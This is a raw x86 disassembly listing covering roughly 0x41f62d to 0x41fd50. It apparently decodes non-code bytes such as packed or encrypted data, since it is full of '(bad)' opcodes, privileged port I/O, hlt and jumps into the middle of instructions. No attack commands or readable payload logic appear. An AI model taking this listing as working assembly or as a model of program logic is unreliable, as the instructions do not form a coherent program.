  41f62d:	fistp  QWORD PTR [eax+0x52]
  41f630:	ins    BYTE PTR es:[edi],dx
  41f631:	lods   eax,DWORD PTR ds:[esi]
  41f632:	and    BYTE PTR [edi],0xf9
  41f635:	int    0x4b
  41f637:	lahf   
  41f638:	imul   DWORD PTR [ebx]
  41f63a:	jl     0x41f642
  41f63c:	je     0x41f5fd
  41f63e:	iret   
  41f63f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f640:	jbe    0x41f677
  41f642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f643:	loop   0x41f6a1
  41f645:	xor    ch,bl
  41f647:	jecxz  0x41f5d3
  41f649:	ds xchg ebx,eax
  41f64b:	(bad)  
  41f64c:	js     0x41f657
  41f64e:	sti    
  41f64f:	stc    
  41f650:	loopne 0x41f6ce
  41f652:	inc    edx
  41f653:	mov    ds,WORD PTR [ecx+ebx*1]
  41f656:	dec    edx
  41f657:	aaa    
  41f658:	or     esi,0xffffffa6
  41f65b:	ret    
  41f65c:	adc    DWORD PTR [ecx-0x6d],0x38
  41f660:	or     ebx,DWORD PTR [esi]
  41f662:	xchg   esi,eax
  41f663:	mov    al,ds:0x714ddf80
  41f668:	xchg   edx,eax
  41f669:	mov    ds:0x5c884fbb,eax
  41f66e:	in     al,0xbf
  41f670:	stos   DWORD PTR es:[edi],eax
  41f671:	fs ret 
  41f673:	xchg   esp,eax
  41f674:	gs pushf 
  41f676:	and    eax,0x15f6f78e
  41f67b:	mov    al,ds:0x4618f87a
  41f680:	into   
  41f681:	xchg   ch,dl
  41f683:	repz sahf 
  41f685:	mov    esi,0x8e56f18d
  41f68a:	shl    ebx,cl
  41f68c:	xor    ecx,DWORD PTR [esi+ebp*8-0x7f]
  41f690:	aas    
  41f691:	adc    al,0xac
  41f693:	mov    al,0x50
  41f695:	cmp    edi,DWORD PTR [eax+0x5f]
  41f698:	mul    BYTE PTR [ebx-0x73]
  41f69b:	sub    al,0xab
  41f69d:	dec    eax
  41f69e:	jno    0x41f6f5
  41f6a0:	mov    al,ds:0xe68c1ab5
  41f6a5:	(bad)  
  41f6a6:	(bad)  
  41f6a7:	pop    ebx
  41f6a8:	mov    ds:0x7521063c,al
  41f6ad:	pop    es
  41f6ae:	mov    ecx,0x2afa1967
  41f6b3:	mov    eax,0xf2c32962
  41f6b8:	test   DWORD PTR [eax],edx
  41f6ba:	aam    0x53
  41f6bc:	jl     0x41f6df
  41f6be:	lods   al,BYTE PTR ds:[esi]
  41f6bf:	push   ebx
  41f6c0:	popf   
  41f6c1:	mov    BYTE PTR [ebp+0x72],bl
  41f6c4:	inc    edi
  41f6c5:	mov    al,0xc0
  41f6c7:	rol    DWORD PTR [eax+0x7f],1
  41f6ca:	dec    ebp
  41f6cb:	int3   
  41f6cc:	cmp    eax,0xcdac649c
  41f6d1:	loopne 0x41f71e
  41f6d3:	rcl    BYTE PTR cs:[ebx+0x25],0xb3
  41f6d8:	push   0xd08b9f0c
  41f6dd:	sub    BYTE PTR [edi+ebx*2-0x35],ch
  41f6e1:	mov    BYTE PTR [eax+eiz*4],cl
  41f6e4:	nop
  41f6e5:	rcl    WORD PTR [ebp-0x6c],1
  41f6e9:	and    eax,0xd7f2cc97
  41f6ee:	push   edi
  41f6ef:	cmp    esi,DWORD PTR [esi+0x16f6debb]
  41f6f5:	xlat   BYTE PTR ds:[ebx]
  41f6f6:	mov    eax,ds:0x6571303c
  41f6fb:	xchg   ecx,eax
  41f6fc:	addr16 retf 
  41f6fe:	dec    edi
  41f6ff:	dec    eax
  41f700:	dec    edx
  41f701:	dec    edx
  41f702:	lea    ebx,[edi-0x2f]
  41f705:	stc    
  41f706:	xchg   edx,eax
  41f707:	retf   
  41f708:	in     eax,dx
  41f709:	mov    eax,0x32de9b4e
  41f70e:	inc    esp
  41f70f:	stos   BYTE PTR es:[edi],al
  41f710:	les    edi,FWORD PTR [ecx+0x22]
  41f713:	push   ebp
  41f714:	jge    0x41f732
  41f716:	jl     0x41f6f9
  41f718:	sub    DWORD PTR [edi-0x5a],esi
  41f71b:	xor    edx,esi
  41f71d:	inc    eax
  41f71e:	pop    esp
  41f71f:	gs add dh,al
  41f722:	ja     0x41f746
  41f724:	xchg   esp,eax
  41f725:	jae    0x41f768
  41f727:	icebp  
  41f728:	xchg   ebx,eax
  41f729:	dec    ebx
  41f72a:	js     0x41f7a1
  41f72c:	leave  
  41f72d:	(bad)  
  41f72e:	fstp   TBYTE PTR [edx-0x6a4b6b15]
  41f734:	push   ecx
  41f735:	loopne 0x41f6da
  41f737:	jle    0x41f72c
  41f739:	(bad)  
  41f73a:	fwait
  41f73b:	test   DWORD PTR ds:0x2b1c38dc,esp
  41f741:	call   0x2383:0x5fac9a2f
  41f748:	pop    edx
  41f749:	jne    0x41f6d4
  41f74b:	jb     0x41f6da
  41f74d:	sti    
  41f74e:	loopne 0x41f763
  41f750:	sar    DWORD PTR [esi+eax*2],0x42
  41f754:	mov    bl,0x37
  41f756:	push   0xffffff8d
  41f758:	xor    al,0x53
  41f75a:	push   ecx
  41f75b:	jns    0x41f7d2
  41f75d:	ja     0x41f770
  41f75f:	push   ss
  41f760:	mov    edx,0xa27e7a85
  41f765:	(bad)  
  41f766:	jne    0x41f716
  41f768:	mov    al,ds:0xb53817ee
  41f76d:	mov    al,ds:0xcdc4fb52
  41f772:	push   edi
  41f773:	hlt    
  41f774:	pop    ss
  41f775:	dec    edi
  41f776:	idiv   BYTE PTR [edx-0x150852b7]
  41f77c:	stc    
  41f77d:	xchg   DWORD PTR cs:[edi],ecx
  41f780:	mov    dh,BYTE PTR ds:0xfd98e57d
  41f786:	(bad)  
  41f787:	mov    WORD PTR [ebp-0x63e168bd],es
  41f78d:	xor    bl,BYTE PTR [ebp-0x10]
  41f790:	jmp    0x41f75b
  41f792:	push   ss
  41f793:	mov    edi,DWORD PTR [ebp-0x2f]
  41f796:	adc    DWORD PTR [edi+0x29863b1e],esp
  41f79c:	pop    edi
  41f79d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f79e:	jp     0x41f80b
  41f7a0:	repz mov esi,?
  41f7a3:	jns    0x41f820
  41f7a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7a6:	addr16 lahf 
  41f7a8:	sahf   
  41f7a9:	ret    0xd148
  41f7ac:	shr    bl,1
  41f7ae:	pushf  
  41f7af:	sub    ebp,ebp
  41f7b1:	mov    ?,WORD PTR [esi]
  41f7b3:	outs   dx,BYTE PTR ds:[esi]
  41f7b4:	jmp    0x63df263c
  41f7b9:	sar    BYTE PTR [edx+0x6eb46566],0x32
  41f7c0:	adc    al,0x5a
  41f7c2:	add    BYTE PTR [ebx+0x2e],bl
  41f7c5:	sub    al,0x1d
  41f7c7:	and    ebp,edi
  41f7c9:	(bad)  
  41f7ca:	add    eax,0xe1308275
  41f7cf:	cmp    al,0x8d
  41f7d1:	(bad)  
  41f7d2:	popf   
  41f7d3:	mov    esp,DWORD PTR [edi-0x6afc71a1]
  41f7d9:	ret    
  41f7da:	jp     0x41f771
  41f7dc:	aam    0x1e
  41f7de:	inc    edx
  41f7df:	dec    edi
  41f7e0:	adc    eax,0xca4a59db
  41f7e5:	push   es
  41f7e6:	and    eax,0xb6745aa4
  41f7eb:	inc    ebp
  41f7ec:	stc    
  41f7ed:	ins    BYTE PTR es:[edi],dx
  41f7ee:	add    DWORD PTR [ebx+0x7b],esi
  41f7f1:	out    0xb9,eax
  41f7f3:	mov    esi,0x569f24a
  41f7f8:	sbb    eax,0xce8dd7ae
  41f7fd:	(bad)  [edi+0x0]
  41f800:	outs   dx,DWORD PTR ds:[esi]
  41f801:	push   esp
  41f802:	stos   BYTE PTR es:[edi],al
  41f803:	(bad)  
  41f804:	hlt    
  41f805:	push   esp
  41f806:	bswap  ecx
  41f808:	dec    edi
  41f809:	xor    eax,0xde2a9ad4
  41f80e:	cmp    edx,DWORD PTR [ebp+0x6e]
  41f811:	ret    
  41f812:	ror    BYTE PTR [esp+eax*4],0x21
  41f816:	dec    edx
  41f817:	jb     0x41f818
  41f819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f81a:	sub    ecx,DWORD PTR [ebx-0x75dfa72]
  41f820:	pop    esi
  41f821:	mov    bl,0x7a
  41f823:	inc    edx
  41f824:	mov    ch,0xed
  41f826:	sahf   
  41f827:	push   ss
  41f828:	jne    0x41f7cc
  41f82a:	sub    al,0x23
  41f82c:	stos   DWORD PTR es:[edi],eax
  41f82d:	test   DWORD PTR [ebx+0x15],ebp
  41f830:	leave  
  41f831:	call   0x3ba42ea1
  41f836:	daa    
  41f837:	xor    bl,bh
  41f839:	in     eax,0x28
  41f83b:	mov    bl,0x90
  41f83d:	inc    esi
  41f83e:	stos   DWORD PTR es:[edi],eax
  41f83f:	and    cl,cl
  41f841:	shr    BYTE PTR ds:0x658f4de0,0x8d
  41f848:	dec    esi
  41f849:	bound  edx,QWORD PTR [edx]
  41f84b:	test   BYTE PTR [edx-0x39],ch
  41f84e:	cmp    ch,bh
  41f850:	pushf  
  41f851:	mov    ecx,0x9a897a15
  41f856:	pop    edx
  41f857:	rcr    BYTE PTR [ebx-0x5f63e6e8],1
  41f85d:	lods   eax,DWORD PTR ds:[esi]
  41f85e:	aas    
  41f85f:	arpl   WORD PTR ds:0x32569e7d,si
  41f865:	jnp    0x41f86e
  41f867:	jne    0x41f86c
  41f869:	adc    BYTE PTR fs:[ebx-0x5a],ch
  41f86d:	jmp    DWORD PTR [ebx+0x19]
  41f870:	fs int 0xd0
  41f873:	mov    edi,0x2d291e98
  41f878:	ret    
  41f879:	sub    DWORD PTR [eax],eax
  41f87b:	ret    
  41f87c:	mov    ds:0x16b97c0,al
  41f881:	cmp    eax,0x1cfe1605
  41f886:	pop    ebp
  41f887:	icebp  
  41f888:	call   0x6d71d5b0
  41f88d:	xor    BYTE PTR [edi+0x74],cl
  41f890:	addr16 (bad) 
  41f892:	jecxz  0x41f830
  41f894:	xchg   edx,eax
  41f895:	pop    esi
  41f896:	inc    ecx
  41f897:	push   0xffffffc7
  41f899:	pop    esi
  41f89a:	mov    ebp,0xda0eab0a
  41f89f:	in     eax,0x77
  41f8a1:	lea    ebp,ds:0xb548d318
  41f8a7:	ret    
  41f8a8:	call   0x2c6ae7b5
  41f8ad:	or     BYTE PTR [ebx+0x7],dh
  41f8b0:	mov    WORD PTR fs:[edi-0x47e51a4],gs
  41f8b7:	mov    al,ds:0xf0aee93e
  41f8bc:	xor    ebx,0xfffffffb
  41f8bf:	mov    ecx,?
  41f8c1:	xchg   ecx,eax
  41f8c2:	js     0x41f863
  41f8c4:	enter  0x5b3e,0x8a
  41f8c8:	pop    ebp
  41f8c9:	stos   BYTE PTR es:[edi],al
  41f8ca:	xor    al,0x10
  41f8cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8cd:	mov    dh,BYTE PTR [ecx]
  41f8cf:	dec    ebx
  41f8d0:	mov    ebp,0xc6c190fc
  41f8d5:	neg    BYTE PTR [edx+eiz*1]
  41f8d8:	pop    edx
  41f8d9:	std    
  41f8da:	mov    eax,0xc2c10e9
  41f8df:	cmp    al,0x14
  41f8e1:	inc    esi
  41f8e2:	rcl    DWORD PTR [esi-0xe],cl
  41f8e5:	test   ch,cl
  41f8e7:	mov    ds:0xf1de8d93,eax
  41f8ec:	retf   0xb663
  41f8ef:	mov    al,ds:0xe345fba6
  41f8f4:	(bad)  
  41f8f6:	jno    0x41f8b7
  41f8f8:	dec    ebx
  41f8f9:	sahf   
  41f8fa:	out    0xfd,al
  41f8fc:	(bad)  
  41f8fd:	dec    eax
  41f8fe:	stos   BYTE PTR es:[edi],al
  41f8ff:	inc    ebp
  41f900:	bnd jle 0x41f93f
  41f903:	jge    0x41f8ac
  41f905:	dec    edi
  41f906:	dec    esp
  41f907:	jb     0x41f88a
  41f909:	stos   BYTE PTR es:[edi],al
  41f90a:	inc    eax
  41f90b:	sbb    cl,BYTE PTR [eax]
  41f90d:	in     eax,0xef
  41f90f:	cmp    ch,0x16
  41f912:	sbb    edi,ebp
  41f914:	rcl    DWORD PTR [ebp-0x7b],1
  41f917:	inc    ecx
  41f918:	jbe    0x41f8ec
  41f91a:	or     DWORD PTR [eax+0x429e288e],esi
  41f920:	sub    dl,BYTE PTR [eax+0x13e915a7]
  41f926:	(bad)  
  41f927:	mov    bl,0x93
  41f929:	stos   DWORD PTR es:[edi],eax
  41f92a:	mov    ch,BYTE PTR [edx-0x2cd81864]
  41f930:	cmp    al,0x12
  41f932:	out    dx,al
  41f933:	sbb    al,0x7e
  41f935:	adc    al,0x8a
  41f937:	out    dx,eax
  41f938:	leave  
  41f939:	lea    ebx,[edx]
  41f93b:	addr16 xchg edx,eax
  41f93d:	dec    esp
  41f93e:	shr    DWORD PTR [edi-0x51],1
  41f941:	pop    ecx
  41f942:	push   ss
  41f943:	fdivr  st,st(1)
  41f945:	pop    ss
  41f946:	mov    ah,0x1a
  41f948:	cmp    esp,eax
  41f94a:	pop    edi
  41f94b:	dec    edi
  41f94c:	mov    cl,0x64
  41f94e:	cwde   
  41f94f:	lock mov DWORD PTR [ecx],esi
  41f952:	pop    edi
  41f953:	jmp    0x41f8fc
  41f955:	aaa    
  41f956:	dec    edx
  41f957:	cdq    
  41f958:	pop    ecx
  41f959:	(bad)  [ebp+0x3f]
  41f95c:	jnp    0x41f8ec
  41f95e:	cli    
  41f95f:	jbe    0x41f983
  41f961:	sub    bl,ah
  41f963:	push   esi
  41f964:	enter  0x4e87,0xf6
  41f968:	mov    ds:0x31b4259a,eax
  41f96d:	mov    esp,0x4b6d6d6a
  41f972:	in     eax,dx
  41f973:	push   es
  41f974:	jnp    0x41f969
  41f976:	xor    ecx,DWORD PTR [edi+0x7]
  41f979:	lds    eax,FWORD PTR [ebp+0x59b968a5]
  41f97f:	int3   
  41f980:	dec    esi
  41f981:	test   al,0xea
  41f983:	das    
  41f984:	ja     0x41f93a
  41f986:	xor    eax,0x14bc2c35
  41f98b:	xor    dh,BYTE PTR [ebx]
  41f98d:	mov    dl,0xa9
  41f98f:	and    ebp,ebp
  41f991:	loop   0x41f92c
  41f993:	in     eax,0x9
  41f995:	aam    0x7a
  41f997:	pushf  
  41f998:	jmp    0xdfcd9ccc
  41f99d:	imul   ecx,DWORD PTR [edx+esi*8-0x72],0xfffffff4
  41f9a2:	in     al,0xd3
  41f9a4:	or     al,0x1d
  41f9a6:	and    ch,al
  41f9a8:	cmp    al,0x31
  41f9aa:	xor    BYTE PTR [ebx+0x72],0xff
  41f9ae:	icebp  
  41f9af:	enter  0xe306,0x1d
  41f9b3:	dec    esp
  41f9b4:	sti    
  41f9b5:	and    edi,DWORD PTR [esi]
  41f9b7:	cmp    DWORD PTR [edx-0x57],ebp
  41f9ba:	pop    eax
  41f9bb:	jg     0x41f9dd
  41f9bd:	ins    DWORD PTR es:[edi],dx
  41f9be:	push   ecx
  41f9bf:	ficom  DWORD PTR [esi]
  41f9c1:	imul   edx,DWORD PTR [eax-0x408754ab],0xc1951a0a
  41f9cb:	pop    esp
  41f9cc:	out    0x3e,eax
  41f9ce:	imul   ebp,DWORD PTR [eax+0x2b],0x530f99ba
  41f9d5:	aas    
  41f9d6:	fidivr DWORD PTR [edi-0x2ac75548]
  41f9dc:	ins    DWORD PTR es:[edi],dx
  41f9dd:	pop    esp
  41f9de:	(bad)  
  41f9df:	(bad)  
  41f9e0:	mov    bh,0xa0
  41f9e2:	pop    edx
  41f9e3:	or     al,0x72
  41f9e5:	loopne 0x41f9ea
  41f9e7:	hlt    
  41f9e8:	mov    dl,0x50
  41f9ea:	dec    eax
  41f9eb:	jne    0x41f9d4
  41f9ed:	hlt    
  41f9ee:	jle    0x41f997
  41f9f0:	leave  
  41f9f1:	push   es
  41f9f2:	pop    esi
  41f9f3:	outs   dx,DWORD PTR ds:[esi]
  41f9f4:	jbe    0x41f9f4
  41f9f6:	cmp    BYTE PTR [esp+esi*2-0x6d9b4c3c],ah
  41f9fd:	jmp    0xe12e6b9a
  41fa02:	add    eax,ecx
  41fa04:	mov    esp,0xb7c91d37
  41fa09:	fdiv   DWORD PTR [ebp-0x6e]
  41fa0c:	inc    esi
  41fa0d:	mov    ds:0xb3135289,eax
  41fa12:	sbb    esi,ecx
  41fa14:	jmp    0x41fa56
  41fa16:	out    dx,eax
  41fa17:	inc    ecx
  41fa18:	jns    0x41f9b4
  41fa1a:	inc    eax
  41fa1b:	enter  0x8352,0x10
  41fa1f:	push   ebx
  41fa20:	faddp  st(4),st
  41fa22:	add    DWORD PTR [eax+ecx*4-0x778dea31],0x2c8e0a4e
  41fa2d:	retf   0x1d3c
  41fa30:	retf   
  41fa31:	inc    ecx
  41fa32:	sbb    BYTE PTR [ebp+0x5b438175],0xa1
  41fa39:	dec    ebp
  41fa3a:	and    eax,DWORD PTR [ecx+0x56]
  41fa3d:	xchg   esi,eax
  41fa3e:	sbb    eax,0xcf58a99f
  41fa43:	stos   DWORD PTR es:[edi],eax
  41fa44:	mov    ecx,0x6220280
  41fa49:	inc    eax
  41fa4a:	mov    ebp,DWORD PTR [esi-0x4d]
  41fa4d:	cmp    ebp,ecx
  41fa4f:	jmp    0x41fabb
  41fa51:	pop    eax
  41fa52:	xor    eax,0x4478f898
  41fa57:	ret    0x184d
  41fa5a:	jge    0x41fa2c
  41fa5c:	cld    
  41fa5d:	rcr    BYTE PTR [ebp+0x6c14d39e],cl
  41fa63:	sbb    eax,0xb4e0fa55
  41fa68:	or     bl,bh
  41fa6a:	fstp   DWORD PTR [ecx]
  41fa6c:	clc    
  41fa6d:	and    al,0xa
  41fa6f:	scas   eax,DWORD PTR es:[edi]
  41fa70:	pop    es
  41fa71:	sub    al,0x86
  41fa73:	je     0x41faa3
  41fa75:	scas   eax,DWORD PTR es:[edi]
  41fa76:	das    
  41fa77:	iret   
  41fa78:	in     al,0x69
  41fa7a:	call   0x3425f978
  41fa7f:	sbb    eax,0x4873c6dd
  41fa84:	inc    DWORD PTR [ebx+0x465a2cb7]
  41fa8a:	jns    0x41faff
  41fa8c:	(bad)  [edi-0x5c]
  41fa8f:	std    
  41fa90:	mov    ecx,0xa496795e
  41fa95:	fmulp  st(0),st
  41fa97:	dec    ebp
  41fa98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa9a:	pop    DWORD PTR [ebx]
  41fa9c:	sub    DWORD PTR [ebx-0x2f91a4bb],esp
  41faa2:	add    eax,0x2c817ce9
  41faa7:	ds xor ax,0xb5d2
  41faac:	cmp    bh,cl
  41faae:	dec    ebp
  41faaf:	out    dx,al
  41fab0:	mov    esp,edi
  41fab2:	(bad)  
  41fab3:	enter  0xd1b8,0x74
  41fab7:	repz pop esp
  41fab9:	adc    bh,BYTE PTR [ebp-0x80]
  41fabc:	push   0xffffff83
  41fabe:	inc    edx
  41fabf:	mov    edi,0xa6b3a94c
  41fac4:	idiv   DWORD PTR [ecx-0x44552a2f]
  41faca:	jae    0x41fac3
  41facc:	aas    
  41facd:	jmp    0x41fb27
  41facf:	ja     0x41fb43
  41fad1:	push   ds
  41fad2:	cli    
  41fad3:	test   BYTE PTR [ebp-0x28a74e6d],cl
  41fad9:	test   al,0x8b
  41fadb:	xor    BYTE PTR [ecx*1+0x19cbd2ff],al
  41fae2:	mov    ah,0x6a
  41fae4:	in     al,0x9d
  41fae6:	fnstcw WORD PTR [ebx]
  41fae8:	add    BYTE PTR [edi],ch
  41faea:	dec    ecx
  41faeb:	dec    edi
  41faec:	pop    es
  41faed:	pop    edx
  41faee:	xchg   esi,eax
  41faef:	add    DWORD PTR [edx],0xebbff978
  41faf5:	xlat   BYTE PTR ds:[ebx]
  41faf6:	jg     0x41fb11
  41faf8:	pop    es
  41faf9:	clc    
  41fafa:	or     al,0xfa
  41fafc:	dec    esp
  41fafd:	and    bl,dh
  41faff:	dec    ebp
  41fb00:	sbb    eax,0xb569397
  41fb05:	dec    ecx
  41fb06:	cmp    esp,esi
  41fb08:	jmp    0x9c07:0xf56e91d4
  41fb0f:	(bad)  
  41fb11:	les    ebx,FWORD PTR [edi+edx*4-0x18cb0759]
  41fb18:	lods   eax,DWORD PTR ds:[esi]
  41fb19:	icebp  
  41fb1a:	inc    esp
  41fb1b:	fisubr DWORD PTR [esi-0xec0d7f7]
  41fb21:	ss enter 0xfb5e,0xfe
  41fb26:	mov    ds:0x607327fe,eax
  41fb2b:	jae    0x41fb81
  41fb2d:	add    eax,0x654e51cf
  41fb32:	and    al,0xe0
  41fb34:	xor    DWORD PTR [eax-0x38435a75],esp
  41fb3a:	xor    bl,al
  41fb3c:	adc    al,0x96
  41fb3e:	mov    edx,0x9681343a
  41fb43:	imul   edi,DWORD PTR [edi-0x1525fc53],0xffffffe1
  41fb4a:	inc    esp
  41fb4b:	lods   eax,DWORD PTR ds:[esi]
  41fb4c:	xor    BYTE PTR [esi+ebx*8+0x490abcd6],ch
  41fb53:	retf   
  41fb54:	pusha  
  41fb55:	ja     0x41fbce
  41fb57:	push   edx
  41fb58:	pop    edx
  41fb59:	ret    0xb29e
  41fb5c:	pop    ss
  41fb5d:	scas   eax,DWORD PTR es:[edi]
  41fb5e:	in     eax,dx
  41fb5f:	pop    edi
  41fb60:	dec    edx
  41fb61:	push   eax
  41fb62:	xor    edi,edx
  41fb64:	(bad)  
  41fb65:	bound  ebp,QWORD PTR [edx]
  41fb67:	inc    esi
  41fb68:	stc    
  41fb69:	xor    eax,0xf166756
  41fb6e:	adc    dl,cl
  41fb70:	into   
  41fb71:	(bad)  
  41fb72:	sbb    eax,0x5276e38c
  41fb77:	xor    al,0x76
  41fb79:	outs   dx,BYTE PTR ds:[esi]
  41fb7a:	sub    BYTE PTR [ebx+0x423b3ad],bl
  41fb80:	mov    ecx,0x8710c51a
  41fb85:	push   esp
  41fb86:	sbb    ch,BYTE PTR [edx+0x50b8631e]
  41fb8c:	inc    DWORD PTR [edi-0x7e]
  41fb8f:	mov    esi,0x22a9781d
  41fb94:	pop    esp
  41fb95:	pusha  
  41fb96:	jle    0x41fbec
  41fb98:	sub    ecx,esi
  41fb9a:	fisubr DWORD PTR [edx-0x35]
  41fb9d:	jns    0x41fb76
  41fb9f:	clc    
  41fba0:	xchg   edx,eax
  41fba1:	scas   al,BYTE PTR es:[edi]
  41fba2:	out    0x89,eax
  41fba4:	cmc    
  41fba5:	mov    ds:0x29de0feb,eax
  41fbaa:	push   cs
  41fbab:	push   ss
  41fbac:	adc    BYTE PTR [ebx],ch
  41fbae:	out    dx,eax
  41fbaf:	inc    edi
  41fbb0:	stos   BYTE PTR es:[edi],al
  41fbb1:	into   
  41fbb2:	pushf  
  41fbb3:	aaa    
  41fbb4:	mov    al,ds:0x8a24a481
  41fbb9:	int3   
  41fbba:	inc    eax
  41fbbb:	pushf  
  41fbbc:	and    ah,BYTE PTR [ebp+ebx*1-0x5e]
  41fbc0:	fadd   DWORD PTR [esi+0x765fcdb0]
  41fbc6:	stos   BYTE PTR es:[edi],al
  41fbc7:	mov    ah,0xc5
  41fbc9:	mov    edi,0xc98d885c
  41fbce:	inc    eax
  41fbcf:	pop    ebx
  41fbd0:	or     BYTE PTR [esi+ebx*8-0x5e41dbb7],ah
  41fbd7:	cmc    
  41fbd8:	jne    0x41fb75
  41fbda:	stos   DWORD PTR es:[edi],eax
  41fbdb:	fucom  st(7)
  41fbdd:	ins    DWORD PTR es:[edi],dx
  41fbde:	pop    ecx
  41fbdf:	sub    al,0x3e
  41fbe1:	je     0x41fc18
  41fbe3:	add    ah,ch
  41fbe5:	mov    ds:0xc872fec4,eax
  41fbea:	add    bh,bh
  41fbec:	stos   BYTE PTR es:[edi],al
  41fbed:	scas   eax,DWORD PTR es:[edi]
  41fbee:	dec    ecx
  41fbef:	or     esp,DWORD PTR [esp+eax*8-0x1c]
  41fbf3:	ror    ch,cl
  41fbf5:	pop    ss
  41fbf6:	rcl    DWORD PTR [eax-0x23ad6ec3],cl
  41fbfc:	mov    WORD PTR [ebx+0x9681a52],cs
  41fc02:	pop    ebp
  41fc03:	cs and eax,0xf374aa64
  41fc09:	sub    esp,0xffffffab
  41fc0c:	jle    0x41fbf7
  41fc0e:	jns    0x41fbe1
  41fc10:	into   
  41fc11:	mov    ebp,ebp
  41fc13:	es or  al,ch
  41fc16:	dec    ecx
  41fc17:	pusha  
  41fc18:	adc    BYTE PTR [esi+0x7b90d68],al
  41fc1e:	fistp  DWORD PTR [edi+0x6d]
  41fc21:	or     esp,ebx
  41fc23:	pop    ebx
  41fc24:	call   0x56e9b871
  41fc29:	mov    ebx,0xe6932e4d
  41fc2e:	ds inc edx
  41fc30:	or     dl,BYTE PTR [edx+0x0]
  41fc33:	mov    ds:0x4cc8638e,eax
  41fc38:	fxch   st(4)
  41fc3a:	xor    al,dl
  41fc3c:	jbe    0x41fcb8
  41fc3e:	call   0x1e62490c
  41fc43:	pop    ebx
  41fc44:	retf   
  41fc45:	xor    al,0x3f
  41fc47:	addr16 icebp 
  41fc49:	dec    eax
  41fc4a:	ins    BYTE PTR es:[edi],dx
  41fc4b:	popa   
  41fc4c:	cwde   
  41fc4d:	and    al,0xe5
  41fc4f:	or     BYTE PTR [esi+esi*8-0x2d],dh
  41fc53:	popa   
  41fc54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc55:	pop    esi
  41fc56:	in     eax,dx
  41fc57:	int3   
  41fc58:	xor    eax,edi
  41fc5a:	jnp    0x41fc5a
  41fc5c:	rol    BYTE PTR [ecx+edx*8],cl
  41fc5f:	mov    bl,0x1f
  41fc61:	enter  0x3cd5,0x3d
  41fc65:	in     al,0x2b
  41fc67:	(bad)  
  41fc68:	ins    DWORD PTR es:[edi],dx
  41fc69:	jge    0x41fc6f
  41fc6b:	inc    ebx
  41fc6c:	sub    ebp,DWORD PTR [ebp+0x1c]
  41fc6f:	ss xchg edx,eax
  41fc71:	fnstsw WORD PTR [edi+0x46]
  41fc74:	xchg   ah,al
  41fc76:	xor    BYTE PTR [edx-0x48a524b0],al
  41fc7c:	sub    eax,0xec67f405
  41fc81:	pop    esi
  41fc82:	imul   edx,ebx,0xc0160e13
  41fc88:	xchg   esi,eax
  41fc89:	ret    
  41fc8a:	add    bl,BYTE PTR cs:[ecx]
  41fc8d:	int3   
  41fc8e:	jno    0x41fc15
  41fc90:	mov    eax,0xfa5c32b1
  41fc95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc96:	xor    eax,0x4c29d153
  41fc9b:	pop    DWORD PTR [esi]
  41fc9d:	push   edx
  41fc9e:	in     eax,dx
  41fc9f:	std    
  41fca0:	std    
  41fca1:	cmp    BYTE PTR [ecx],dh
  41fca3:	jg     0x41fcf9
  41fca5:	gs push edi
  41fca7:	jae    0x41fc69
  41fca9:	daa    
  41fcaa:	in     al,dx
  41fcab:	daa    
  41fcac:	scas   al,BYTE PTR es:[edi]
  41fcad:	push   0x5e4609dc
  41fcb2:	adc    al,ch
  41fcb4:	jp     0x41fd1d
  41fcb6:	mov    al,ds:0x3b045515
  41fcbb:	fcom   QWORD PTR [esi-0x43]
  41fcbe:	mov    esp,ebp
  41fcc0:	adc    BYTE PTR [ebx+0x773ffd7f],ch
  41fcc6:	push   0xd154140e
  41fccb:	cwde   
  41fccc:	cmp    dl,BYTE PTR [ecx-0x342bd162]
  41fcd2:	xchg   ecx,eax
  41fcd3:	int3   
  41fcd4:	sub    ecx,edi
  41fcd6:	in     al,0xbc
  41fcd8:	pushf  
  41fcd9:	inc    esi
  41fcda:	mov    ebp,0xeee317ab
  41fcdf:	jno    0x41fd19
  41fce1:	je     0x41fcdf
  41fce3:	cmp    edx,esi
  41fce5:	loop   0x41fd2d
  41fce7:	push   edi
  41fce8:	lock xor ch,BYTE PTR [esp+ebx*8+0x622ef4a5]
  41fcf0:	sbb    al,cl
  41fcf2:	and    DWORD PTR [ecx+0x10],edi
  41fcf5:	ins    DWORD PTR es:[edi],dx
  41fcf6:	add    DWORD PTR ds:0x27fff1d2,ecx
  41fcfc:	jns    0x41fcd7
  41fcfe:	mov    ch,0x83
  41fd00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd01:	test   ch,cl
  41fd03:	push   es
  41fd04:	aaa    
  41fd05:	shl    DWORD PTR [eax],cl
  41fd07:	mov    dh,0x35
  41fd09:	jle    0x41fce8
  41fd0b:	mov    ch,0x9b
  41fd0d:	adc    eax,0xf9da72a3
  41fd12:	inc    ebx
  41fd13:	shl    edi,0x8b
  41fd16:	dec    esp
  41fd17:	push   0xfd5cb2c3
  41fd1c:	test   BYTE PTR [ecx],0xb4
  41fd1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd20:	das    
  41fd21:	scas   eax,DWORD PTR es:[edi]
  41fd22:	xor    al,0xca
  41fd24:	jecxz  0x41fd1d
  41fd26:	inc    edi
  41fd27:	inc    edx
  41fd28:	adc    esp,eax
  41fd2a:	or     al,0x46
  41fd2c:	push   ebx
  41fd2d:	shl    BYTE PTR [edx+0x76],0x5e
  41fd31:	cmp    DWORD PTR [ebx],0x7a
  41fd34:	outs   dx,BYTE PTR ds:[esi]
  41fd35:	adc    eax,0xf3052c48
  41fd3a:	hlt    
  41fd3b:	push   edx
  41fd3c:	inc    ecx
  41fd3d:	dec    edi
  41fd3e:	jno    0x41fd21
  41fd40:	add    eax,0x14ad7204
  41fd45:	rcr    DWORD PTR [ebp+0x48],cl
  41fd48:	and    ah,bh
  41fd4a:	mov    eax,ecx
  41fd4c:	inc    eax
  41fd4d:	add    DWORD PTR fs:[ebx],ecx
  41fd50:	daa    
